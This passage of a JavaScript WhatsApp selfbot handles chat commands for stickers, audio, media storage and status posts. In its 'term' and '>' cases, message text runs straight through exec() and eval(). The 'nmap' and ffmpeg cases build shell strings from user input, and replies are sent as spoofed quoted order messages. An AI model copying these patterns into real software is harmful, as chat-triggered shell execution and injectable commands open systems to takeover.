				ptt: true,
				quoted: {
					key: {
						fromMe: false,
						participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6281219087237-1620254146@g.us" } : {})
					},
					message: {
   							orderMessage: {
   								thumbnail: fs.readFileSync('./src/image/MFarelSZ.jpeg'),
    							message: fake,
    							orderTitle: 'MFarelSZ.xyz',
    							sellerJid: '0@s.whatsapp.net'
   							  }
					}
				}
			})
					})
					break
				case 'bass':
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					media = await client.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -af equalizer=f=94:width_type=o:width=2:g=30 ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return faketroli(`Error: ${err}`)
						hah = fs.readFileSync(ran)
			client.sendMessage(from, hah, audio, {
				mimetype: 'audio/mp4',
				ptt: true,
				quoted: {
					key: {
						fromMe: false,
						participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6281219087237-1620254146@g.us" } : {})
					},
					message: {
   							orderMessage: {
   								thumbnail: fs.readFileSync('./src/image/MFarelSZ.jpeg'),
    							message: fake,
    							orderTitle: 'MFarelSZ.xyz',
    							sellerJid: '0@s.whatsapp.net'
   							  }
					}
				}
			})
						fs.unlinkSync(ran)
					})
					break
				case 'trigger':
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
						ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						faketroli(mess.wait)
						owgi = await client.downloadAndSaveMediaMessage(ger)
						anu = await imgbb("3b8594f4cb11895f4084291bc655e510", owgi)
						teks = `${anu.display_url}`
						ranp = getRandom('.gif')
						rano = getRandom('.webp')
						anu1 = `https://some-random-api.ml/canvas/triggered?avatar=${teks}`
						exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
							fs.unlinkSync(ranp)
							exec(`webpmux -set exif ${addMetadata(`${config.author}`, `${config.packname}`)} ${rano} -o ${rano}`, async (error) => {
								if (error) return faketroli(`Error: ${error}`)
			client.sendMessage(from, fs.readFileSync(rano), sticker, {
				quoted: {
					key: {
						fromMe: false,
						participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6281219087237-1620254146@g.us" } : {})
					},
					message: {
   							orderMessage: {
   								thumbnail: fs.readFileSync('./src/image/MFarelSZ.jpeg'),
    							message: fake,
    							orderTitle: 'MFarelSZ.xyz',
    							sellerJid: '0@s.whatsapp.net'
   							  }
					}
				}
			})
								fs.unlinkSync(rano)
							})
						})
					} else {
						faketroli(mess.wrongFormat)
					}
					break
				case 'wasted':
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
						ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						owgi = await client.downloadAndSaveMediaMessage(ger)
						anu = await imgbb("3b8594f4cb11895f4084291bc655e510", owgi)
						teks = `${anu.display_url}`
						ranp = getRandom('.gif')
						rano = getRandom('.webp')
						anu2 = `https://some-random-api.ml/canvas/wasted?avatar=${teks}`
						exec(`wget ${anu2} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
							fs.unlinkSync(ranp)
							if (err) return faketroli(`Error: ${err}`)
							exec(`webpmux -set exif ${addMetadata(`${config.author}`, `${config.packname}`)} ${rano} -o ${rano}`, async (error) => {
								if (error) return faketroli(`Error: ${error}`)
			client.sendMessage(from, fs.readFileSync(rano), sticker, {
				quoted: {
					key: {
						fromMe: false,
						participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6281219087237-1620254146@g.us" } : {})
					},
					message: {
   							orderMessage: {
   								thumbnail: fs.readFileSync('./src/image/MFarelSZ.jpeg'),
    							message: fake,
    							orderTitle: 'MFarelSZ.xyz',
    							sellerJid: '0@s.whatsapp.net'
   							  }
					}
				}
			})
								fs.unlinkSync(rano)
							})
						})
					} else {
						faketroli('Gunakan foto!')
					}
					break
				/*case 'playstore':
					if (!q) return fakegroup(mess.wrongFormat)
					try {
						fakegroup(mess.wait)
						anu = await fetchJson(`https://api.vhtear.com/playstore?query=${q}&apikey=${config.VhtearKey}`, { method: 'get' })
						for (let ply of anu.result) {
							store = `*「 PLAYSTORE 」*\n\n• Nama Apk: ${ply.title}\n• ID: ${ply.app_id}\n• Developer: ${ply.developer}\n• Deskripsi: ${ply.description}\n• Link Apk: https://play.google.com/${ply.url}\n\n`
						}
						fakegroup(store.trim())
					} catch (err) {
						fakegroup(`Error: ${err}`)
					}
					break
				case 'infoalamat':
					if (!q) return fakegroup(mess.wrongFormat)
					try {
						fakegroup(mess.wait)
						anu = await fetchJson(`https://api.vhtear.com/infoalamat?query=${q}&apikey=${config.VhtearKey}`, { method: 'get' })
						fakegroup(`${anu.result.data}`)
					} catch (err) {
						fakegroup(`Error: ${err}`)
					}
					break
				case 'igstalk':
					if (!q) return fakegroup(mess.wrongFormat)
					try {
						fakegroup(mess.wait)
						anu = await fetchJson(`https://api.vhtear.com/igprofile?query=${q}&apikey=${config.VhtearKey}`, { method: 'get' })
						bufferigstalk = await getBuffer(anu.result.picture)
						hasil = `「 *INSTAGRAM STALKER* 」

• Fullname: ${anu.result.full_name}
• Post: ${anu.result.post_count}
• Followers: ${convertBalanceToString(anu.result.follower)}
• Following: ${convertBalanceToString(anu.result.follow)}
• Jumlah Postingan: ${convertBalanceToString(anu.result.post_count)}
• Bio: ${anu.result.biography}
• Link: https://www.instagram.com/${anu.result.username}`
						client.sendMessage(from, bufferigstalk, image, { quoted: mek, caption: hasil })
					} catch (err) {
						fakegroup(`Error: ${err}`)
					}
					break*/
				case 'upswteks':
					var upswteks = body.slice(10)
					var thetext = upswteks.split("|")[0];
					var code_bg = '0xff' + upswteks.split("|")[1];
					var code_text = '0xff' + upswteks.split("|")[2];
					var choosefont = upswteks.split("|")[3];

					client.sendMessage('status@broadcast', {
						text: `${thetext}`,
						backgroundArgb : `${code_bg}`,
						textArgb: `${code_text}`,
						font: choosefont
					}, 'extendedTextMessage')
					faketroli(`Suskes Up Story Whatsapp\nText: ${upswteks}\nBackground: ${code_bg}\nText Background: ${code_text}\nFont: ${choosefont}.`)
					break
				case 'upswgambar':
					kay = body.slice(12)
					client.updatePresence(from, Presence.composing)
					if (isQuotedImage) {
						const swsw = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						cihcih = await client.downloadMediaMessage(swsw)
						client.sendMessage('status@broadcast', cihcih, image, { caption: `${kay}` })
					}
					faketroli(`Sukses Upload Story Gambar Dengan Caption: ${kay}`)
					break
				case 'upswvideo':
					kay = body.slice(11)
					client.updatePresence(from, Presence.composing)
					if (isQuotedVideo) {
						const swsw = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						cihcih = await client.downloadMediaMessage(swsw)
						client.sendMessage('status@broadcast', cihcih, video, { caption: `${kay}` })
					}
					faketroli(`Sukses Upload Story Video dengan Caption: ${kay}`)
					break
				/*case 'tiktok':
					if (!q) return fakegroup(mess.wrongFormat)
					try {
						fakegroup(mess.wait)
						anu = await fetchJson(`https://api.vhtear.com/tiktokdl?link=${q}&apikey=${config.VhtearKey}`, { method: 'get' })
						buffertiktok = await getBuffer(anu.result.video)
						client.sendMessage(from, buffertiktok, video, { quoted: mek })
					} catch (err) {
						fakegroup(`Error: ${err}`)
					}
					break
				case 'puisiimg':
					try {
						pus = await getBuffer(`https://api.vhtear.com/puisi_image&apikey=${config.VhtearKey}`, { method: 'get' })
						client.sendMessage(from, pus, image, { quoted: mek })
					} catch (err) {
						fakegroup(`Error: ${err}`)
					}
					break
				case 'ssweb':
					if (!q) return fakegroup(mess.wrongFormat)
					try {
						fakegroup(mess.wait)
						buffssweb = await getBuffer(`https://api.vhtear.com/ssweb?link=${q}&type=pc&apikey=${config.VhtearKey}`, { method: 'get' })
						client.sendMessage(from, buffssweb, image, { quoted: mek, caption: `RESULT: ${q}` })
					} catch (err) {
						fakegroup(`Error: ${err}`)
					}
					break*/
				case '>':
					lerr = body.slice(3)
					faketroli(JSON.stringify(eval(lerr)))
					break
				case 'tomp3':
					client.updatePresence(from, Presence.composing)
					if (!isQuotedVideo) return faketroli(mess.wrongFormat)
					faketroli(mess.wait)
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					media = await client.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp4')
					exec(`ffmpeg -i ${media} ${ran}`, (err) => {
						fs.unlinkSync(media)
						if (err) return faketroli(`Err: ${err}`)
						buffer453 = fs.readFileSync(ran)
			client.sendMessage(from, buffer453, audio, {
				mimetype: 'audio/mp4',
				quoted: {
					key: {
						fromMe: false,
						participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6281219087237-1620254146@g.us" } : {})
					},
					message: {
   							orderMessage: {
   								thumbnail: fs.readFileSync('./src/image/MFarelSZ.jpeg'),
    							message: fake,
    							orderTitle: 'MFarelSZ.xyz',
    							sellerJid: '0@s.whatsapp.net'
   							  }
					}
				}
			})
						fs.unlinkSync(ran)
					})
					break
				case 'getsticker':
					namastc = body.slice(12)
					result = fs.readFileSync(`./src/sticker/${namastc}.webp`)
			client.sendMessage(from, result, sticker, {
				quoted: {
					key: {
						fromMe: false,
						participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6281219087237-1620254146@g.us" } : {})
					},
					message: {
   							orderMessage: {
   								thumbnail: fs.readFileSync('./src/image/MFarelSZ.jpeg'),
    							message: fake,
    							orderTitle: 'MFarelSZ.xyz',
    							sellerJid: '0@s.whatsapp.net'
   							  }
					}
				}
			})
					break
				case 'stickerlist':
				case 'liststicker':
					teks = '*Sticker List*\n\n'
					for (let awokwkwk of setiker) {
						teks += `• ${awokwkwk}\n`
					}
					teks += `\n*Total : ${setiker.length}*`
					faketroli(teks)
					break
				case 'addsticker':
				ssss = body.slice(12)
					if (!isQuotedSticker) return faketroli(mess.wrongFormat)
					if (!ssss) return faketroli(mess.wrongFormat)
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await client.downloadMediaMessage(boij)
					setiker.push(`${ssss}`)
					fs.writeFileSync(`./src/sticker/${ssss}.webp`, delb)
					fs.writeFileSync('./src/stik.json', JSON.stringify(setiker))
					faketroli(`Sukses Menambahkan Sticker\nCek dengan cara ${prefix}liststicker`)
					break
				case 'delsticker':
				ssss = body.slice(12)
					if (!ssss) return faketroli(mess.wrongFormat)
					try {
						fs.unlinkSync(`./src/sticker/${ssss}.webp`)
						faketroli(`Succes delete sticker ${ssss}!`)
					} catch (err) {
						faketroli(`Gagal delete sticker ${ssss}!`)
					}
					break
				case 'addvn':
				ssss = body.slice(7)
					if (!isQuotedAudio) return faketroli(mess.wrongFormat)
					if (!ssss) return faketroli(mess.wrongFormat)
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await client.downloadMediaMessage(boij)
					audionye.push(`${ssss}`)
					fs.writeFileSync(`./src/audio/${ssss}.mp3`, delb)
					fs.writeFileSync('./src/audio.json', JSON.stringify(audionye))
					faketroli(`Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`)
					break
				case 'getvn':
				ssss = body.slice(7)
					if (!ssss) return faketroli(mess.wrongFormat)
					buffer764 = fs.readFileSync(`./src/audio/${ssss}.mp3`)
			client.sendMessage(from, buffer764, audio, {
				mimetype: 'audio/mp4',
				ptt: true,
				quoted: {
					key: {
						fromMe: false,
						participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6281219087237-1620254146@g.us" } : {})
					},
					message: {
   							orderMessage: {
   								thumbnail: fs.readFileSync('./src/image/MFarelSZ.jpeg'),
    							message: fake,
    							orderTitle: 'MFarelSZ.xyz',
    							sellerJid: '0@s.whatsapp.net'
   							  }
					}
				}
			})
					break
				case 'delvn':
				ssss = body.slice(7)
					if (!ssss) return faketroli(mess.wrongFormat)
					try {
						fs.unlinkSync(`./src/audio/${ssss}.mp3`)
						faketroli(`Succes delete vn ${ssss}!`)
					} catch (err) {
						faketroli(`Gagal delete vn ${ssss}!`)
					}
					break
				case 'listvn':
				case 'vnlist':
					teks = '*List Vn:*\n\n'
					for (let awokwkwk of audionye) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${audionye.length}*`
					faketroli(teks.trim())
					break
				case 'setthumb':
					if (!isQuotedImage) return faketroli('Reply imagenya!')
					const messimagethumb = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					const downiamgethumb = await client.downloadMediaMessage(messimagethumb)
					fs.unlinkSync(`./src/image/MFarelSZ.jpeg`)
					await sleep(2000)
					fs.writeFileSync(`./src/image/MFarelSZ.jpeg`, downiamgethumb)
					faketroli('Succes')
					break
				case 'addimage':
				ssss = body.slice(10)
					if (!isQuotedImage) return faketroli(mess.wrongFormat)
					if (!ssss) return faketroli(mess.wrongFormat)
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await client.downloadMediaMessage(boij)
					imagenye.push(`${ssss}`)
					fs.writeFileSync(`./src/image/${ssss}.jpeg`, delb)
					fs.writeFileSync('./src/image.json', JSON.stringify(imagenye))
					faketroli(`Sukses Menambahkan image\nCek dengan cara ${prefix}listimage`)
					break
				case 'getimage':
				ssss = body.slice(10)
					if (!ssss) return faketroli(mess.wrongFormat)
					bufferc4 = fs.readFileSync(`./src/image/${ssss}.jpeg`)
			client.sendMessage(from, bufferc4, image, {
				quoted: {
					key: {
						fromMe: false,
						participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6281219087237-1620254146@g.us" } : {})
					},
					message: {
   							orderMessage: {
   								thumbnail: fs.readFileSync('./src/image/MFarelSZ.jpeg'),
    							message: fake,
    							orderTitle: 'MFarelSZ.xyz',
    							sellerJid: '0@s.whatsapp.net'
   							  }
					}
				}
			})
					break
				case 'delimage':
				ssss = body.slice(10)
					if (!ssss) return faketroli(mess.wrongFormat)
					try {
						fs.unlinkSync(`./src/image/${ssss}.jpeg`)
						faketroli(`Succes delete image ${ssss}.jpeg`)
					} catch (err) {
						faketroli(`Gagal delete image ${ssss}.jpeg`)
					}
					break
				case 'imagelist':
				case 'listimage':
					teks = '*List Image :*\n\n'
					for (let awokwkwk of imagenye) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${imagenye.length}*`
					faketroli(teks.trim())
					break
				case 'addvideo':
				ssss = body.slice(10)
					if (!isQuotedVideo) return faketroli(mess.wrongFormat)
					if (!ssss) return faketroli(mess.wrongFormat)
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await client.downloadMediaMessage(boij)
					videonye.push(`${ssss}`)
					fs.writeFileSync(`./src/video/${ssss}.mp4`, delb)
					fs.writeFileSync('./src/video.json', JSON.stringify(videonye))
					faketroli(`Sukses Menambahkan Video\nCek dengan cara ${prefix}listvideo`)
					break
				case 'getvideo':
				ssss = body.slice(10)
					if (!ssss) return faketroli(mess.wrongFormat)
					bufferx2w = fs.readFileSync(`./src/video/${ssss}.mp4`)
			client.sendMessage(from, bufferx2w, video, {
				mimetype: 'video/mp4',
				quoted: {
					key: {
						fromMe: false,
						participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6281219087237-1620254146@g.us" } : {})
					},
					message: {
   							orderMessage: {
   								thumbnail: fs.readFileSync('./src/image/MFarelSZ.jpeg'),
    							message: fake,
    							orderTitle: 'MFarelSZ.xyz',
    							sellerJid: '0@s.whatsapp.net'
   							  }
					}
				}
			})
					break
				case 'delvideo':
				ssss = body.slice(10)
					if (!ssss) return faketroli(mess.wrongFormat)
					try {
						fs.unlinkSync(`./src/video/${ssss}.mp4`)
						faketroli(`Succes delete video ${ssss}.mp4`)
					} catch (err) {
						faketroli(`Gagal delete video ${ssss}.mp4`)
					}
					break
				case 'listvideo':
				case 'videolist':
					teks = '*List Video :*\n\n'
					for (let awokwkwk of videonye) {
						teks += `• ${awokwkwk}\n`
					}
					teks += `\n*Total : ${videonye.length}*`
					faketroli(teks)
				case 'leave':
					faketroli(`Assalamualaikum...`)
					sleep(2000)
					client.groupLeave(groupId)
					break
				case 'chatlist':
				case 'cekchat':
					client.updatePresence(from, Presence.composing)
					faketroli(`Total : ${totalchat.length} Chat`)
					break
				case 'speed':
				case 'ping':
					const timestamp = speed();
					const latensi = speed() - timestamp
					exec(`neofetch --stdout`, (error, stdout, stderr) => {
						const child = stdout.toString('utf-8')
						const teks = child.replace(/Memory:/, "Ram:")
						const pingnya = `${teks}\nSpeed: ${latensi.toFixed(4)} Second`
						faketroli(pingnya)
					})
					break
				case 'term':
					gasga = body.slice(6)
					if (!gasga) return faketroli(mess.wrongFormat)
					exec(gasga, (err, stdout) => {
						if (err) return faketroli(`root@MFarelSZ:~ ${err}`)
						if (stdout) {
							faketroli(stdout)
						}
					})
					break
				case 'nmap':
					gasga = body.slice(6)
					if (!gasga) return faketroli(mess.wrongFormat)
					exec(`nmap ${gasga}`, (err, stdout) => {
						if (err) return faketroli(`root@MFarelSZ~# ${err}`)
						if (stdout) {
							faketroli(`root@MFarelSZ~# ${stdout}`)
						}
					})
					break
				case 'donate':
				case 'donasi':
					faketroli(`*──「 DONATE 」──*\n\n• GoPay: 0812-1908-7237\n• Pulsa: 0812-1908-7237\n• Dana: 0812-1908-7237\n• OVO: 0812-1908-7237\n\n`)
					break
				case 'blocklist':
					teks = 'LIST BLOCK\n'
					for (let block of blocked) {
						teks += `•  @${block.split('@')[0]}\n`
					}
					teks += `Total: ${blocked.length}`
					faketroli(teks.trim())
					break
				case 'stiker':
				case 'sticker':
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						const media = await client.downloadAndSaveMediaMessage(encmedia)
						ran = getRandom('.webp')
						await ffmpeg(`./${media}`)
							.input(media)
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								faketroli(mess.error.stick)
							})
							.on('end', function () {
								console.log('Finish')
								exec(`webpmux -set exif ${addMetadata(`${config.author}`, `${config.packname}`)} ${ran} -o ${ran}`, async (error) => {
									if (error) return faketroli(mess.error.stick)
									//await costum(fs.readFileSync(ran), sticker, FarhanGans, ` ~ Nihh Udah Jadi Stikernya`)
									await client.sendMessage(from, fs.readFileSync(ran), sticker, {
																					quoted: {
																							key: {
																								fromMe: false,
																								participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6281219087237-1620254146@g.us" } : {})
																								},
																					message: {
   																							orderMessage: {
   																										thumbnail: fs.readFileSync('./src/image/MFarelSZ.jpeg'),
    																									message: fake,
    																									orderTitle: 'MFarelSZ.xyz',
    																									sellerJid: '0@s.whatsapp.net'
   							  																			}
																							}
																							}
																					})
									fs.unlinkSync(media)
									fs.unlinkSync(ran)
								})
							})
							.addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(ran)
					} else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						const media = await client.downloadAndSaveMediaMessage(encmedia)
						ran = getRandom('.webp')
						faketroli(mess.wait)
						await ffmpeg(`./${media}`)
							.inputFormat(media.split('.')[1])
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								tipe = media.endsWith('.mp4') ? 'video' : 'gif'
								faketroli(`❌ Gagal, pada saat mengkonversi ${tipe} ke stiker`)
							})
							.on('end', function () {
								console.log('Finish')
								exec(`webpmux -set exif ${addMetadata(`${config.author}`, `${config.packname}`)} ${ran} -o ${ran}`, async (error) => {
									if (error) return faketroli(mess.error.stick)
									//await costum(fs.readFileSync(ran), sticker, FarhanGans, `~ Nih Dah Jadi Gif Stikernya`)
									await client.sendMessage(from, fs.readFileSync(ran), sticker, {
																					quoted: {
																							key: {
																								fromMe: false,
																								participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6281219087237-1620254146@g.us" } : {})
																								},
																					message: {
   																							orderMessage: {
   																										thumbnail: fs.readFileSync('./src/image/MFarelSZ.jpeg'),
    																									message: fake,
    																									orderTitle: 'MFarelSZ.xyz',
    																									sellerJid: '0@s.whatsapp.net'
   							  																			}
																							}
																							}
																					})
									fs.unlinkSync(media)
									fs.unlinkSync(ran)
								})
							})
							.addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(ran)
					} else if ((isMedia || isQuotedImage) && args[0] == 'nobg') {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						const media = await client.downloadAndSaveMediaMessage(encmedia)
						ranw = getRandom('.webp')
						ranp = getRandom('.png')
						faketroli(mess.wait)
						keyrmbg = 'Your-ApiKey'
						await removeBackgroundFromImageFile({ path: media, apiKey: keyrmbg, size: 'auto', type: 'auto', ranp }).then(res => {
							fs.unlinkSync(media)
							let bufferir9vn5 = Buffer.from(res.base64img, 'base64')
							fs.writeFileSync(ranp, bufferir9vn5, (err) => {
								if (err) return faketroli('Gagal, Terjadi kesalahan, silahkan coba beberapa saat lagi.')
							})
							exec(`ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${ranw}`, (err) => {
								fs.unlinkSync(ranp)
								if (err) return faketroli(mess.error.stick)
								exec(`webpmux -set exif ${addMetadata(`${config.author}`, authorname)} ${ranw} -o ${ranw}`, async (error) => {
									if (error) return faketroli(mess.error.stick)
									await client.sendMessage(from, fs.readFileSync(ranw), sticker, {
																					quoted: {
																							key: {
																								fromMe: false,
																								participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6281219087237-1620254146@g.us" } : {})
																								},
																					message: {
   																							orderMessage: {
   																										thumbnail: fs.readFileSync('./src/image/MFarelSZ.jpeg'),
    																									message: fake,
    																									orderTitle: 'MFarelSZ.xyz',
    																									sellerJid: '0@s.whatsapp.net'
   							  																			}
																							}
																							}
																					})
									fs.unlinkSync(ranw)
								})
							})
						})
					} else {
						faketroli(`Kirim gambar dengan caption ${prefix}sticker atau tag gambar yang sudah dikirim`)
					}
					break
				case 'tts':
					if (args.length < 1) return faketroli(mess.wrongFormat)
					const gtts = require('./lib/gtts')(args[0])
					if (args.length < 2) return faketroli(mess.wrongFormat)
					dtt = body.slice(8)
					ranm = getRandom('.mp3')
					rano = getRandom('.ogg')
					dtt.length > 300
						? faketroli('teksnya kebanyakan..')
						: gtts.save(ranm, dtt, function () {
							exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
								fs.unlinkSync(ranm)
								buff = fs.readFileSync(rano)
								if (err) return faketroli(`Err: ${err}`)
			client.sendMessage(from, buff, audio, {
				ptt: true,
				quoted: {
					key: {
						fromMe: false,
						participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6281219087237-1620254146@g.us" } : {})
					},
					message: {
   							orderMessage: {
   								thumbnail: fs.readFileSync('./src/image/MFarelSZ.jpeg'),
    							message: fake,
    							orderTitle: 'MFarelSZ.xyz',
    							sellerJid: '0@s.whatsapp.net'
   							  }
					}
				}
			})
								fs.unlinkSync(rano)
							})
						})
					break
				case 'setprefix':
					if (!q) return faketroli(mess.wrongFormat)
					prefix = q
					faketroli(`Succes Mengganti Prefix : ${q}`)
					break
				case 'setfake':
					hhhh = body.slice(9)
					if (!hhhh) return faketroli(mess.wrongFormat)
					fake = hhhh
					faketroli(`Succes Mengganti Conversation Fake : ${hhhh}`)
					break
				case 'setnomor':
					hhhh = body.slice(10)
					if (!hhhh) return faketroli(mess.wrongFormat)
					numbernye = hhhh
					faketroli(`Succes Mengganti Number Conversation : ${hhhh}`)
					break
				case 'dare':
					const mathdare = dare[Math.floor(Math.random() * (dare.length))]
					faketroli(mathdare)
					break
				case 'readallchat':
					const readallid = await client.chats.all()
					client.setMaxListeners(25)
					for (let xyz of readallid) {
						await client.chatRead(xyz.jid)
					}
					faketroli('Success read all chat')
					break
				case 'clearall':
					anu = await client.chats.all()
					client.setMaxListeners(25)
					for (let _ of anu) {
						client.deleteChat(_.jid)
					}
					faketroli('Success delete all chat')
					break
				case 'listadmin':
					if (!isGroup) return faketroli(mess.only.group)
					teks = `List mimin ${groupMetadata.subject}*\nTotal : ${groupAdmins.length}\n\n`
					no = 0
					for (let admon of groupAdmins) {
						no += 1
						teks += `${no.toString()} @${admon.split('@')[0]}\n`
					}
					mentions(teks, groupAdmins, true)
					break
				case 'toimg':
					{
						if (!isQuotedSticker) return faketroli(`Reply stickernya kaka`)
						faketroli(mess.wait)
						encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
						media = await client.downloadAndSaveMediaMessage(encmedia)
						ran = getRandom('.png')
						exec(`ffmpeg -i ${media} ${ran}`, (err) => {
							fs.unlinkSync(media)
							if (err) return faketroli(`Err: ${err}`)
							bufferi9nn = fs.readFileSync(ran)
			client.sendMessage(from, bufferi9nn, image, {
				quoted: {
					key: {
						fromMe: false,
						participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6281219087237-1620254146@g.us" } : {})
					},
					message: {
   							orderMessage: {
   								thumbnail: fs.readFileSync('./src/image/MFarelSZ.jpeg'),
    							message: fake,
    							orderTitle: 'MFarelSZ.xyz',
    							sellerJid: '0@s.whatsapp.net'
   							  }
					}
				}
			})
							fs.unlinkSync(ran)
						});
					}
					break
				case 'afk':
					if (args[0] === 'enable') {
						//if (isAfkAlreadyON) return fakestatus(mess.afkalready)
						if (config.afkkontak === true) return
						config.afkkontak = true
						afkkontak = true
						fs.writeFileSync('./config.json', JSON.stringify(config, null, 2))
						await faketroli(mess.afkenable)
					} else if (args[0] === 'disable') {
						if (config.afkkontak === false) return
						config.afkkontak = false
						afkkontak = false
						fs.writeFileSync('./config.json', JSON.stringify(config, null, 2))
						await faketroli(mess.afkdisable)
					} else {
						await faketroli(messs.wrongFormat)
					}
					break
				case 'afktag':
					if (isAFKTAG) return faketroli(mess.afkgroupalready)
					if (args[0] === 'enable') {
						config.afktag.status = true
						afktag.status = true
						afkdatabase.push(from)
						fs.writeFileSync('./config.json', JSON.stringify(config, null, 2))
						fs.writeFileSync('./src/afk-taggc.json', JSON.stringify(afkdatabase, null, 2))
						await faketroli(mess.afkenable)
					} else if (args[0] === 'disable') {
						config.afktag.status = false
						afktag.status = false
						afkdatabase.splice(from, 1)
						fs.writeFileSync('./config.json', JSON.stringify(config, null, 2))
						fs.writeFileSync('./src/afk-taggc.json', JSON.stringify(afkdatabase, null, 2))
						await faketroli(mess.afkdisable)
					} else {
						await faketroli(messs.wrongFormat)
					}
					break
				default:
			}
			if (isGroup && budy != undefined) {
			} else {
				console.log(color('[ MFarelSZ ]', 'green'), 'Any Message ? ', color(sender.split('@')[0]))
			}
		}
	} catch (e) {
		console.log('Message : %s', color(e, 'green'))
		// console.log(e)
	}
})
